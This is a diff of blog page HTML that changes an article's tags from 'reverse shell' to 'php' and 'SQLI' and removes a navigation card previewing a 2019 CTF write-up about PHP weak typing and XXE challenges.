@@ -783,58 +906,12 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" target="_blank">
-                        <span class="chip bg-color">反弹shell</span>
+                    <a href="/tags/php/" target="_blank">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/12/10/%E4%B8%89%E5%8F%B6%E8%8D%89%E6%8B%9B%E6%96%B0%E8%B5%9B/">
-                    <div class="card-image">
-                        
-                        <img src="/img/1.jpg" class="responsive-img" alt="三叶草招新赛部分wp">
-                        
-                        <span class="card-title">三叶草招新赛部分wp</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            三叶草招新赛部分wp最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ
-性感黄阿姨在线聊天打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）题目分两层，一层PHP弱类型一层XXE（xml实体注入）
-弱类型比
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
-                                    刷题记录
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/xxe/" target="_blank">
-                        <span class="chip bg-color">xxe</span>
+                    <a href="/tags/SQLI/" target="_blank">
+                        <span class="chip bg-color">SQLI</span>
                     </a>
                     
                 </div>
